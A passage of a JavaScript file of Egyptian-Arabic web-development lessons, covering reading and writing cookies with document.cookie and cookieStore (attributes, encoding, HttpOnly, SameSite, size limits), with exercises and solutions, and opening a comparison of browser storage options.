            mistakes: R`تخزين object من غير [[JSON.stringify]]. [[if (getItem("flag"))]] على [["false"]]. [[JSON.parse]] من غير [[try]]. [[setItem(k, null)]] بدل [[removeItem]]. توكن أو باسورد. الاعتماد على ترتيب [[key(i)]]. توقّع إن الحدث [[storage]] بيوصل لنفس التاب. نسيان إن [[localhost]] و [[127.0.0.1]] origins مختلفين.`,
          },
        },
        {
          cmd: "document.cookie",
          title: "الكوكيز من JavaScript: نص غريب بتكتبه كوكي كوكي، وبيتبعت للسيرفر مع كل طلب",
          desc: R`الكوكي زوج «اسم=قيمة» صغير (لحد ٤٠٩٦ حرف) المتصفح بيخزّنه لدومين، و**بيبعته لوحده مع كل طلب** للسيرفر ده في header اسمه [[Cookie]]. عادة السيرفر هو اللي بيحطها بـ [[Set-Cookie]]، بس JavaScript يقدر يقرا ويكتب الكوكيز اللي مش [[HttpOnly]] بـ [[document.cookie]].
• القراية: [[document.cookie]] = نص واحد [["a=1; b=2"]] فيه الأسامي والقيم بس.
• الكتابة: [[document.cookie = "theme=dark; max-age=31536000; path=/; SameSite=Lax"]] بتضيف أو بتعدّل كوكي **واحدة**، مش بتمسح الباقي.
• الخصايص: [[max-age]] أو [[expires]] (من غيرهم: تموت مع قفل المتصفح)، و [[path]]، و [[domain]]، و [[SameSite=Strict|Lax|None]]، و [[Secure]].
• المسح: نفس الاسم ونفس [[path]] مع [[max-age=0]].
• [[HttpOnly]] مبيتكتبش من JS، والكوكي اللي عليها مبتظهرش في [[document.cookie]] خالص.
• القيمة: [[encodeURIComponent]] لأي حاجة فيها [[;]] أو مسافة أو عربي.
• الحديث: [[cookieStore]] (Baseline 2025) بـ Promises و [[get]] و [[set]] و [[delete]] وحدث [[change]].`,
          example: R`document.cookie = "theme=dark";
document.cookie = "lang=ar; max-age=3600; path=/; SameSite=Lax";
console.log(document.cookie);
document.cookie = "theme=light";
document.cookie = "city=" + encodeURIComponent("الجيزة; وسط البلد");
document.cookie = "sid=hack; HttpOnly";
console.log(document.cookie);
document.cookie = "theme=; max-age=0";
console.log(document.cookie);`,
          try: R`شغّل المثال في Console صفحة من سيرفر محلي، وبعدين افتح DevTools: Application ثم Cookies. كل كوكي مكتوب جنبها Expires و Path و SameSite إيه؟ وفين [[sid]]؟`,
          sol: R`~~~text الناتج (Chrome 157، http://localhost)
theme=dark; lang=ar
theme=light; city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; lang=ar
city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; lang=ar
~~~

وفي Application ثم Cookies: [[lang]] ليها Expires بعد ساعة، و [[theme]] و [[city]] مكتوب «Session» (هتموت مع قفل المتصفح)، والـ Path [[/]] للكل، والـ SameSite فاضي (يعني الافتراضي Lax). و [[sid]] مش موجودة خالص: المتصفح رفض كوكي جاية من JS وعليها [[HttpOnly]].`,
          teach: R`## الفكرة

الكوكيز اتعملت عشان HTTP مالوش ذاكرة: كل طلب لوحده. فالسيرفر بيقول للمتصفح «احفظ ده»، والمتصفح بيرجّعه في كل طلب بعد كده:

~~~text
السيرفر ← المتصفح:  Set-Cookie: sid=abc123; HttpOnly; Path=/; SameSite=Lax
المتصفح ← السيرفر:  Cookie: lang=ar; sid=abc123          (مع كل طلب لنفس الموقع)
~~~

ده الفرق الأساسي عن [[localStorage]]: **الكوكي بتسافر.** السيرفر بيشوفها قبل ما الصفحة توصل (الثيم من غير وميض، اللوجين)، بس كمان بتتقل كل طلب، وبتتبعت حتى للصور. كل النواتج من Chrome 157 على [[http://localhost:8765]] من سيرفر [[node:http]] صغير فيه [[/echo-cookie]] (بيرجّع الـ header [[Cookie]] اللي وصله) و [[/set-httponly]] (بيبعت [[Set-Cookie]]).

---

## ١. القراية: نص واحد

~~~text الناتج: سطر ٣ في المثال
theme=dark; lang=ar
~~~

[[document.cookie]] **getter** بيرجّع كل الكوكيز اللي JS مسموح يشوفها، مفصولة بـ [["; "]]، **الاسم والقيمة بس**: مفيش تاريخ انتهاء ولا path. عشان تجيب واحدة لازم تقسّم النص بنفسك:

~~~js get-cookie.js
function getCookie(name) {
  for (const part of document.cookie.split("; ")) {
    const i = part.indexOf("=");
    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
  }
  return null;
}
~~~

ليه [[indexOf("=")]] مش [[split("=")]]: القيمة نفسها ممكن يبقى فيها [[=]] (base64 مثلًا). وليه المقارنة بالاسم كامل مش [[startsWith]]: [[getCookie("lang")]] كانت هتلاقي [[xlang=en]] (تمرين ١).

---

## ٢. الكتابة: كوكي واحدة كل مرة

**[[document.cookie = "..."]] setter**، مش متغيّر: كل تعيين بيضيف أو بيعدّل كوكي واحدة، والباقي زي ما هو. [[theme=light]] عدّلت [[theme]] بس وسابت [[lang]].

~~~text
document.cookie = "lang=ar; max-age=3600; path=/; SameSite=Lax"
                   ^^^^^^^  ^^^^^^^^^^^^  ^^^^^^^  ^^^^^^^^^^^^
                   الاسم والقيمة  الخصايص: مش بتتقرا تاني، بتتحفظ مع الكوكي
~~~

| الخاصية | بتعمل إيه | من غيرها |
|---|---|---|
| [[max-age=ثواني]] | تموت بعد كام ثانية ([[31536000]] = سنة) | كوكي session: تموت مع قفل المتصفح |
| [[expires=تاريخ]] | تموت في تاريخ بصيغة [[toUTCString()]]: [[Thu, 31 Dec 2026 00:00:00 GMT]] | نفس اللي فوق. لو الاتنين موجودين [[max-age]] يكسب |
| [[path=/]] | بتتبعت وبتتشاف للعناوين اللي تحت المسار ده | المسار الحالي: كوكي اتعملت في [[/admin/x]] مش هتتشاف من [[/]] |
| [[domain=example.com]] | بتشمل الـ subdomains | الدومين الحالي بس، من غير subdomains |
| [[SameSite=Lax]] | متتبعتش مع طلبات من مواقع تانية، إلا لما اليوزر يدوس لينك | **Lax** في Chrome |
| [[SameSite=Strict]] | متتبعتش من أي موقع تاني خالص | |
| [[SameSite=None]] | بتتبعت من أي حتة، **ولازم معاها [[Secure]]** | |
| [[Secure]] | HTTPS بس | بتتبعت على HTTP كمان |

**اتقاس:**

- [[only=admin; path=/admin]] اتحفظت بس مظهرتش في [[document.cookie]] على [[/]].
- [[sec=1; Secure]] **اتحفظت على [[http://localhost]]**: Chrome بيعتبر [[localhost]] آمن ([[isSecureContext]] = [[true]]). على أي دومين [[http]] تاني كانت هتترفض.
- [[cross=1; SameSite=None]] من غير [[Secure]]: **اترفضت** من غير أي رسالة.
- [[big=]] ومعاها ٤٠٩٢ حرف (الاسم والقيمة = ٤٠٩٦) اتحفظت، و [[big5=]] ومعاها ٤٠٩٣ (= ٤٠٩٧) **اختفت** من غير error. الحد ٤٠٩٦ للاسم والقيمة مع بعض.

**المسح:** مفيش [[deleteCookie]]. بتكتب نفس الاسم ونفس [[path]] (ونفس [[domain]] لو اتحط) بـ [[max-age=0]] أو [[expires]] في الماضي. لو الـ path مختلف، بتعمل كوكي تانية جديدة والقديمة باقية.

---

## ٣. القيمة: [[;]] و [[,]] والمسافات والعربي

~~~text الناتج (Chrome 157)
document.cookie = "note=قهوة; سكر"          → note=قهوة      (اللي بعد ; اتفهم خاصية واتجاهل)
document.cookie = "note2=" + encodeURIComponent("قهوة; سكر") → note2=%D9%82%D9%87%D9%88%D8%A9%3B%20%D8%B3%D9%83%D8%B1
~~~

والعربي من غير encode: المتصفح خزّنه وعرضه صح في [[document.cookie]]، **بس السيرفر استلمه بايظ**:

~~~text الناتج: /echo-cookie (سيرفر node:http) بعد document.cookie = "city=الجيزة"
JS يشوف:      city=الجيزة
السيرفر استلم: city=Ø§ÙØ¬ÙØ²Ø©
~~~

الـ headers في HTTP المفروض ASCII. Chrome بعت البايتس UTF-8، و Node قراها حرف لكل بايت (latin1)، فطلعت «Ø§Ù...». القاعدة: **[[encodeURIComponent]] وانت بتكتب، و [[decodeURIComponent]] وانت بتقرا**، في JS وفي السيرفر.

---

## ٤. [[HttpOnly]]: كوكي JS ميشوفهاش

~~~text الناتج: بعد fetch("/set-httponly") اللي بيبعت Set-Cookie: sid=abc123; HttpOnly و theme=dark
JS يشوف:      lang=ar; city=...; theme=dark
السيرفر استلم: lang=ar; city=...; sid=abc123; theme=dark
~~~

- **[[sid]] مش في [[document.cookie]]** بس المتصفح بيبعتها في كل طلب. ده المطلوب لكوكي اللوجين: لو حصل XSS، السكربت الخبيث مش هيقدر يقراها ويبعتها لحد.
- **JS ميقدرش يعمل كوكي [[HttpOnly]]:** [[document.cookie = "sid=hack; HttpOnly"]] اتجاهلت كلها (سطر ٦ في المثال). [[HttpOnly]] من السيرفر بس.
- **JS ميقدرش يمسحها ولا يكتب فوقها** بنفس الاسم.
- وكوكي السيرفر من غير [[HttpOnly]] ([[theme=dark]] هنا) JS بيشوفها ويعدّلها عادي. ده قصد: كوكي الثيم السيرفر يحطها والصفحة تغيّرها.

تقرا الخصايص كلها في DevTools: Application ثم Cookies (درس «Cookies» بتاب الـ web)، و [[SameSite]] والـ CSRF بالتفصيل في درس «CSRF و SameSite».

---

## ٥. [[cookieStore]]: الـ API الجديد

[[document.cookie]] من التسعينات: نص، و sync، ومفيش events. [[cookieStore]] (Cookie Store API) بقى Baseline 2025، وموجود في Chrome 157:

~~~js cookie-store.js (module)
await cookieStore.set({ name: "theme", value: "dark", expires: Date.now() + 7 * 86400000 });
const t = await cookieStore.get("theme");
console.log(t.name, t.value, t.path, t.sameSite);
const all = await cookieStore.getAll();
console.log(all.map(c => c.name).join(","));
cookieStore.addEventListener("change", e => console.log(e.changed.map(c => c.name), e.deleted.map(c => c.name)));
await cookieStore.delete("theme");
~~~

~~~text الناتج (Chrome 157)
theme dark / strict
theme
[] [theme]
~~~

- **[[get]] بيرجّع object** فيه [[name]] و [[value]] و [[path]] و [[sameSite]] و [[expires]] و [[secure]] و [[domain]]: حاجات [[document.cookie]] مبيقولهاش.
- **[[sameSite]] الافتراضي في [[cookieStore.set]] = [["strict"]]**، مش Lax زي [[document.cookie]]. لو الكوكي محتاجة تتبعت لما حد ييجي من لينك برّه، حط [[sameSite: "lax"]] بنفسك.
- **حدث [[change]]** بيوصل لما الكوكي تتغيّر حتى بـ [[document.cookie]] (تمرين ٥).
- **[[cookieStore.set("bad;name", "x")]]** بترمي [[TypeError: Failed to execute 'set' on 'CookieStore': Cookie was malformed and could not be stored, due to problem(s) while parsing.]] بدل ما تبوّظ بصمت.
- **محتاج secure context** (HTTPS أو localhost)، ومش بيشوف [[HttpOnly]] برضه. ولو لازم تدعم متصفحات قديمة: [[if ("cookieStore" in window)]] وإلا [[document.cookie]].

---

## الخلاصة

| عايز | اكتب |
|---|---|
| تقرا كوكي | [[getCookie(name)]] (split و indexOf و decode)، أو [[await cookieStore.get(name)]] |
| تكتب لسنة | [[document.cookie = name + "=" + encodeURIComponent(v) + "; max-age=31536000; path=/; SameSite=Lax"]] |
| تمسح | نفس الاسم والـ path و [[max-age=0]] |
| كوكي JS ميلمسهاش | [[HttpOnly]] من السيرفر بس |
| تعرف إنها اتغيّرت | [[cookieStore.addEventListener("change", ...)]] |

اللي ميتلخبطش: التعيين بيضيف كوكي واحدة، والقراية من غير خصايص، والقيمة encode، و [[SameSite=None]] من غير [[Secure]] بتترفض، والحد ٤٠٩٦ حرف وبتختفي من غير error، والكوكي بتتبعت مع كل طلب فخليها صغيرة.`,
          lines: [
            R`كوكي session (من غير [[max-age]]): تموت مع قفل المتصفح`,
            R`كوكي لساعة، لكل الموقع، ومتتبعتش من مواقع تانية إلا من لينك`,
            R`بيطبع [[theme=dark; lang=ar]]: الأسامي والقيم بس من غير الخصايص`,
            R`نفس الاسم: بيعدّل [[theme]] بس، و [[lang]] زي ما هي`,
            R`[[encodeURIComponent]] بيحوّل العربي والـ [[;]] والمسافة لـ [[%XX]] عشان القيمة متتقطعش`,
            R`[[HttpOnly]] من JS: المتصفح بيتجاهل السطر كله ومبيعملش الكوكي`,
            R`[[lang]] و [[theme]] و [[city]] بس، من غير [[sid]]`,
            R`مفيش دالة مسح: بنكتب نفس الاسم بقيمة فاضية و [[max-age=0]] فالمتصفح يشيلها`,
            R`فاضل [[lang]] و [[city]] بس، لأن [[theme]] اتمسحت و [[sid]] عمرها ما اتعملت`,
          ],
          practice: [
            { lvl: 'تطبيق', t: R`**ابني:** [[getCookie(name)]] بترجّع القيمة بعد [[decodeURIComponent]] أو [[null]]، ومبتلخبطش بين [[lang]] و [[xlang]]. اختبرها بـ [[lang=ar]] و [[xlang=en]] وقيمة فيها [[;]] وعربي، واسأل السيرفر ([[/echo-cookie]]) هو استلم إيه (من قسمي ١ و ٣ في الشرح).`, done: R`[[getCookie("lang")]] = [["ar"]] حتى و [[xlang]] موجودة، و [[getCookie("la")]] = [[null]]، والقيمة العربي رجعت زي ما هي، والسيرفر استلم القيمة encoded.`, sol: R`~~~js cookies.js (صفحة من سيرفر محلي، module)
function getCookie(name) {
  for (const part of document.cookie.split("; ")) {
    const i = part.indexOf("=");
    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
  }
  return null;
}
console.log(JSON.stringify(getCookie("lang")));
document.cookie = "lang=ar; path=/";
document.cookie = "city=" + encodeURIComponent("الجيزة; وسط البلد") + "; path=/";
document.cookie = "xlang=en; path=/";
console.log(getCookie("lang"), "|", getCookie("city"), "|", getCookie("la"), "|", getCookie("xlang"));
console.log("server:", await (await fetch("/echo-cookie")).text());
~~~

~~~text الناتج (Chrome 157، كوكيز فاضية في الأول)
null
ar | الجيزة; وسط البلد | null | en
server: lang=ar; city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; xlang=en
~~~

- **[[part.slice(0, i) === name]]** مقارنة كاملة. [[part.startsWith(name + "=")]] كمان صح، بس [[startsWith(name)]] لوحدها كانت هترجّع [[xlang]] لو اتطلب [[x]].
- **[[document.cookie]] الفاضي** = [[""]]، و [[split("; ")]] بيرجّع [[[""]]]، و [[indexOf]] = [[-1]]، فالمقارنة [[false]] والدالة بترجّع [[null]] من غير ما تقع.
- **السيرفر** محتاج [[decodeURIComponent]] هو كمان. Express بـ [[cookie-parser]] بيعملها لوحده.` },
            { lvl: 'تطبيق', t: R`**ابني:** [[setCookie(name, value, { days = 365, path = "/", sameSite = "Lax", secure })]] بترجّع النص اللي اتكتب، و [[secure]] افتراضي [[true]] على https بس، و [[deleteCookie(name, path)]]. جرّبها واطبع [[document.cookie]] بعد المسح (من قسم ٢ في الشرح).`, done: R`النص المطبوع فيه [[max-age=31536000]] و [[path=/]] و [[SameSite=Lax]]، والقيمة العربي encoded، وبعد [[deleteCookie("lang")]] الكوكي مش موجودة.`, sol: R`~~~js set-cookie.js (صفحة من سيرفر محلي)
function setCookie(name, value, { days = 365, path = "/", sameSite = "Lax", secure = location.protocol === "https:" } = {}) {
  let c = encodeURIComponent(name) + "=" + encodeURIComponent(value) + "; max-age=" + Math.round(days * 86400) + "; path=" + path + "; SameSite=" + sameSite;
  if (secure) c += "; Secure";
  document.cookie = c;
  return c;
}
const deleteCookie = (name, path = "/") => { document.cookie = encodeURIComponent(name) + "=; max-age=0; path=" + path; };

console.log(setCookie("lang", "ar"));
console.log(setCookie("city", "الجيزة; وسط البلد", { days: 7 }));
deleteCookie("lang");
console.log(document.cookie);
~~~

~~~text الناتج (Chrome 157، http://localhost)
lang=ar; max-age=31536000; path=/; SameSite=Lax
city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; max-age=604800; path=/; SameSite=Lax
city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF
~~~

- **[[= {}]] في الآخر** بيخلي الـ options اختيارية كلها: [[setCookie("lang", "ar")]] من غير object.
- **[[secure]] من البروتوكول:** على [[http://localhost]] مش هيتحط، وعلى الموقع الحقيقي (https) هيتحط لوحده.
- **[[deleteCookie]] بنفس الـ path:** لو الكوكي اتعملت بـ [[path=/admin]] لازم تمسحها بـ [[deleteCookie(name, "/admin")]].
- **[[max-age]] مش [[expires]]:** أبسط (ثواني) ومش محتاج تحسب تاريخ، وكل المتصفحات الحالية بتدعمه.` },
            { lvl: 'سريع', t: R`**اقرا وتوقّع:** صفحة كوكيزها فاضية. بالترتيب: [[document.cookie = "theme=dark"]]، و [[= "theme=light"]]، و [[= "note=قهوة; سكر"]]، و [[= "sid=hack; HttpOnly"]]، و [[= "only=admin; path=/admin"]]، و [[= "cross=1; SameSite=None"]]. إيه اللي [[document.cookie]] هيطبعه على [[http://localhost/]]؟ (من قسمي ٢ و ٤ في الشرح).`, done: R`كتبت [[theme=light; note=قهوة]] بس، وعارف ليه كل واحدة من الأربعة التانيين مش موجودة.`, sol: R`~~~js الـ Console (http://localhost:8765/، الكوكيز اتمسحت الأول)
document.cookie = "theme=dark";
document.cookie = "theme=light";
document.cookie = "note=قهوة; سكر";
document.cookie = "sid=hack; HttpOnly";
document.cookie = "only=admin; path=/admin";
document.cookie = "cross=1; SameSite=None";
console.log(document.cookie);
~~~

~~~text الناتج (Chrome 157)
theme=light; note=قهوة
~~~

- **[[theme]]:** نفس الاسم = تعديل.
- **[[note]]:** «سكر» بعد [[;]] اتفهمت خاصية مش معروفة واتجاهلت.
- **[[sid]]:** [[HttpOnly]] من JS = الكوكي كلها اترفضت.
- **[[only]]:** اتحفظت، بس الـ path [[/admin]] فمش بتتشاف من [[/]].
- **[[cross]]:** [[SameSite=None]] من غير [[Secure]] = اترفضت.` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** صفحة بتحفظ المدينة بـ [[document.cookie = "city=" + city]]، والسيرفر بيرحّب «أهلًا يا جاي من الجيزة» من الكوكي. لما اليوزر كتب «الجيزة» السيرفر كتب حاجة غريبة. استخدم [[/echo-cookie]] (أو [[console.log(req.headers.cookie)]] في سيرفرك) عشان تشوف اللي وصل، وصلّح الطرفين (من قسم ٣ في الشرح).`, done: R`شفت «Ø§ÙØ¬ÙØ²Ø©» في السيرفر، وبعد الإصلاح السيرفر بيطبع «الجيزة».`, sol: R`~~~js الصفحة: قبل وبعد
document.cookie = "city=الجيزة; path=/";
console.log("JS:", document.cookie);
console.log("server:", await (await fetch("/echo-cookie")).text());
document.cookie = "city=" + encodeURIComponent("الجيزة") + "; path=/";
console.log("server بعد:", await (await fetch("/echo-cookie")).text());
~~~

~~~js server.js (الجزء اللي بيقرا الكوكي)
function readCookie(req, name) {
  for (const part of (req.headers.cookie || "").split("; ")) {
    const i = part.indexOf("=");
    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
  }
  return null;
}
~~~

~~~text الناتج (Chrome 157 والسيرفر node:http على Node 24.22)
JS: city=الجيزة
server: city=Ø§ÙØ¬ÙØ²Ø©
server بعد: city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9
readCookie(req, "city") بعد: الجيزة
~~~

(السطر الأخير من [[readCookie]] في Node 24.22 على نفس الـ header اللي السيرفر استلمه.)

- **ليه JS شايفها صح والسيرفر لأ:** المتصفح بيخزّن النص زي ما هو، ولما بيبعته في الـ header بيبعته بايتس UTF-8. الـ headers في HTTP المفروض ASCII، و Node بيقرا أي بايت فوق ١٢٧ كحرف latin1 لوحده، فالحرف العربي (بايتين) بقى حرفين غريبين.
- **[[encodeURIComponent]]** بيخلي القيمة ASCII بس ([[%D8%A7...]])، فبتعدّي سليمة في أي سيرفر.
- **غلطة تانية في الكود الأصلي:** من غير [[path=/]] الكوكي بتاخد مسار الصفحة الحالية، فلو اتعملت من [[/settings/city]] مش هتتبعت مع [[/]].` },
            { lvl: 'تطبيق', t: R`**ابني:** بـ [[cookieStore]]: اسمع على [[change]] واطبع كل اسم اتغيّر أو اتمسح، وبعدين [[set]] كوكي [[theme]] لأسبوع، و [[get]] واطبع كل خصايصها، وغيّرها بـ [[document.cookie]] القديمة، وامسحها بـ [[delete]]. الحدث وصل كام مرة؟ وإيه الـ [[sameSite]] الافتراضي؟ (من قسم ٥ في الشرح).`, done: R`الحدث وصل ٣ مرات (dark ثم light ثم deleted) حتى للتغيير اللي بـ [[document.cookie]]، و [[sameSite]] طلع [["strict"]].`, sol: R`~~~js cookie-store.js (صفحة من سيرفر محلي، module)
const seen = [];
cookieStore.addEventListener("change", e => {
  for (const c of e.changed) seen.push("changed " + c.name + "=" + c.value);
  for (const c of e.deleted) seen.push("deleted " + c.name);
});
await cookieStore.set({ name: "theme", value: "dark", expires: Date.now() + 7 * 86400000 });
const t = await cookieStore.get("theme");
console.log("get:", t.name, t.value, t.path, t.sameSite);
document.cookie = "theme=light; path=/";
await cookieStore.delete("theme");
await new Promise(r => setTimeout(r, 200));
console.log("events:", seen.join(" | "));
~~~

~~~text الناتج (Chrome 157)
get: theme dark / strict
events: changed theme=dark | changed theme=light | deleted theme
~~~

- **الحدث بيوصل لأي تغيير** من الصفحة دي أو من تاب تاني أو من السيرفر ([[Set-Cookie]])، مش بس من [[cookieStore]]. ده اللي [[document.cookie]] مكانش بيقدر عليه غير بـ [[setInterval]] يفحص كل ثانية.
- **[[setTimeout]] ٢٠٠ في الآخر:** الأحداث async، فاستنينا شوية قبل ما نطبع.
- **[[sameSite: "strict"]] افتراضي:** أأمن، بس لو اليوزر جه من لينك في إيميل، الكوكي مش هتتبعت مع أول طلب. الثيم مش مشكلة، اللوجين مشكلة.
- **[[expires]] بالـ ms** ([[Date.now() + ...]]) مش بالثواني زي [[max-age]].` },
          ],
          ref: [
            { t: "MDN: Document.cookie", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie" },
            { t: "MDN: Using HTTP cookies", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies" },
            { t: "MDN: Set-Cookie", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" },
            { t: "MDN: Cookie Store API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API" },
            { t: "MDN: CookieStore", url: "https://developer.mozilla.org/en-US/docs/Web/API/CookieStore" },
          ],
          pre: [{ to: "web/Cookies", why: R`تشوف الكوكيز بخصايصها في Application، و [[HttpOnly]] و [[Secure]]` }, { to: "web/CSRF و SameSite", why: R`ليه [[SameSite]] موجود والهجوم اللي بيمنعه` }, { to: "js/مشروع — CORS والكوكيز", why: R`الكوكيز مع [[fetch]] لسيرفر على دومين تاني و [[credentials]]` }],
          deep: {
            why: R`الكوكي هي الطريقة الوحيدة اللي السيرفر يعرف بيها حاجة عن اليوزر من أول طلب (قبل أي JS): اللوجين، واللغة، والثيم. وكتير من مواقع الشغل فيها كوكيز JS لازم يقراها أو يكتبها (consent banner، تفضيلات)، والـ API غريب بما يكفي إنه يعمل باجات.`,
            how: R`المتصفح عنده «cookie jar» لكل البروفايل. [[Set-Cookie]] أو [[document.cookie =]] بيضيفوا كوكي متعرّفة بالتلاتة: الاسم والدومين والـ path. مع كل طلب المتصفح بيختار الكوكيز اللي الدومين والـ path والـ [[SameSite]] والـ [[Secure]] بتاعتهم ماشيين مع الطلب، ويحطهم في [[Cookie]]. و [[document.cookie]] بيرجّع نفس الاختيار ده من غير اللي عليه [[HttpOnly]].`,
            when: R`كوكي من السيرفر بـ [[HttpOnly; Secure; SameSite=Lax]] للـ session دايمًا. كوكي من JS لتفضيلات صغيرة السيرفر محتاجها قبل ما يرسم الصفحة (الثيم، اللغة). [[localStorage]] لتفضيلات السيرفر مش محتاجها، عشان متتقلش كل طلب. [[cookieStore]] لو محتاج تعرف إن الكوكي اتغيّرت.`,
            mistakes: R`قيمة فيها [[;]] أو عربي من غير encode. مسح بـ path مختلف. [[startsWith]] في القراية. نسيان [[path=/]]. [[SameSite=None]] من غير [[Secure]]. توكن في كوكي JS بيكتبها. كوكيز كبيرة بتتبعت مع كل صورة. توقّع إن [[cookieStore.set]] Lax زي [[document.cookie]].`,
          },
        },
        {
          cmd: "تختار تخزين إيه: cookies و Storage و Cache و IndexedDB",
          title: "٤ أماكن تحفظ فيها في المتصفح: مين لإيه، وإزاي المواقع بتستخدمها تتبعك",
          desc: R`المتصفح فيه ٤ أماكن تخزين لكل موقع: **الكوكيز** (صغيرة وبتتبعت للسيرفر)، و **Web Storage** ([[localStorage]] و [[sessionStorage]]: نصوص صغيرة sync)، و **Cache API** ([[caches]]: طلبات وردود كاملة، للأوفلاين)، و **IndexedDB** (قاعدة بيانات async كبيرة لأي object وملفات). الدرس ده بيقارنهم بالأرقام، وبيقولك تختار مين لكل حالة (الحالة بعد الـ reload، اللوجين، التفضيلات، الشغل أوفلاين)، وبيوريك الجانب الوحش: إزاي الكوكيز والتخزين والـ fingerprinting بيتستخدموا عشان يتتبعوك، وإزاي المتصفحات بتقفل ده بالـ partitioning.
• المقاس كله: [[navigator.storage.estimate()]] و [[navigator.storage.persist()]].`,
          example: R`const before = (await navigator.storage.estimate()).usage;
const cache = await caches.open("lab-v1");
await cache.put("/big", new Response(new Uint8Array(1024 * 1024)));
const { usage, quota, usageDetails } = await navigator.storage.estimate();
console.log(before, usage, usageDetails, (quota / 1024 ** 3).toFixed(1) + " GB");
console.log(await navigator.storage.persisted(), await caches.keys());
await caches.delete("lab-v1");`,
          try: R`افتح DevTools في أي موقع بتستخدمه كتير، وروح Application ثم Storage: الـ «Usage» كام؟ وفي Cookies كام كوكي؟ وبعدين افتح Application ثم Cookies واختار كوكي ليها Domain مش بتاع الموقع ده: دي third-party.`,
          sol: R`مفيش ناتج واحد صح هنا: الأرقام بتختلف من موقع لموقع. اللي اتقاس على صفحة تجربة من سيرفر محلي (Chrome 157، origin فاضي):

~~~text الناتج: المثال
0 1048666 {caches: 1048666} 10.0 GB
false [lab-v1]
~~~

- **[[usage]]** زاد ميجا واحدة بالظبط تقريبًا (١٠٤٨٦٦٦ = ١٠٤٨٥٧٦ بايت داتا و ٩٠ زيادة للرد نفسه).
- **[[quota]]** حوالي ١٠ جيجا: Chrome بيدي كل origin نسبة من مساحة الديسك الفاضية، فالرقم ده بيختلف من جهاز لجهاز.
- **[[persisted()]] = [[false]]:** المتصفح ممكن يمسح التخزين ده لو الديسك اتملا (قسم ٤).`,
          teach: R`## الفكرة

كل مكان اتعمل لمشكلة معينة، واستخدامه في غيرها بيعمل مشاكل. الجدول ده هو الدرس:

| | الكوكيز | [[localStorage]] | [[sessionStorage]] | Cache API | IndexedDB |
|---|---|---|---|---|---|
| بيخزّن | نص | نص | نص | [[Request]] و [[Response]] كاملين | أي object، و [[Blob]] و [[File]] و [[Date]] و [[Map]] |
| المقاس | ٤٠٩٦ حرف للكوكي | حوالي ٥ مليون حرف | حوالي ٥ مليون حرف | من الـ quota الكبيرة (جيجات) | من الـ quota الكبيرة |
| sync؟ | sync ([[cookieStore]] async) | **sync** (بيوقف الصفحة) | **sync** | async (Promise) | async |
| بيتبعت مع الطلبات | **آه، كل طلب** | لأ | لأ | لأ | لأ |
| من service worker أو web worker | لأ (إلا [[cookieStore]] في الـ SW) | لأ | لأ | آه | آه |
| بيعيش لحد | [[max-age]] أو قفل المتصفح | ما يتمسح | قفل التاب | ما يتمسح | ما يتمسح |
| السيرفر يكتبه | آه ([[Set-Cookie]]) | لأ | لأ | لأ | لأ |
| JS ميشوفهوش | [[HttpOnly]] | مستحيل | مستحيل | مستحيل | مستحيل |

النواتج من Chrome 157 على origin فاضي من سيرفر محلي.

---

## ١. اختار حسب السؤال

| الحالة | المكان | ليه |
|---|---|---|
| اللوجين (session) | كوكي [[HttpOnly; Secure; SameSite=Lax]] من السيرفر | بتتبعت لوحدها، و JS (و XSS) مبيشوفهاش |
| الثيم أو اللغة والسيرفر بيرسم الصفحة | كوكي صغيرة | السيرفر يحط [[data-theme]] قبل ما الصفحة توصل، فمفيش وميض (مشروع الملاحظات) |
| الثيم في صفحة static | [[localStorage]] | مش محتاج يسافر مع كل طلب |
| مسودة فورم | [[localStorage]] (أو [[sessionStorage]] لو للتاب ده بس) | صغيرة، ولازم تعيش مع الـ reload |
| خطوة في wizard، فلتر في التاب ده | [[sessionStorage]] | تاب تاني يبدأ من الأول |
| الصفحات والـ CSS والصور للأوفلاين | Cache API من service worker | مصممة للطلب والرد (وحدة «PWA و service worker») |
| رسايل، منتجات، صور اليوزر، آلاف السجلات | IndexedDB | كبيرة، async، بـ indexes، ومن worker |
| حاجة سرية | **ولا واحد** | أي حاجة في المتصفح على جهاز اليوزر |

**غلطات المقاس:** ٥٠٠٠ منتج في [[localStorage]] = [[JSON.parse]] لميجات كل ما الصفحة تفتح، والصفحة واقفة لحد ما يخلص. وتوكن ٢ كيلو في كوكي = ٢ كيلو زيادة مع كل صورة وكل طلب.

---

## ٢. الأماكن الكبيرة: Cache API و IndexedDB

~~~text الناتج: ميجا في Cache وميجا في IndexedDB
قبل: 0.00 MB | بعد Cache: 1.00 MB | بعد IndexedDB: 2.00 MB
details: {"caches":1049088,"indexedDB":1052336}
quota: 10.0 GB
persist(): false
~~~

**Cache API** خزنة طلبات: [[caches.open(name)]] و [[cache.put(request, response)]] و [[cache.add(url)]] (بيعمل fetch ويخزّن) و [[caches.match(url)]]. اتعمل للـ service worker بس شغال من الصفحة كمان (تمرين ٤):

~~~text الناتج: cache.add("/hello.txt") وبعدين النت اتقطع
fetch: TypeError: Failed to fetch
cache: "أهلًا من ملف نص\nسطر تاني\n"
miss: undefined
~~~

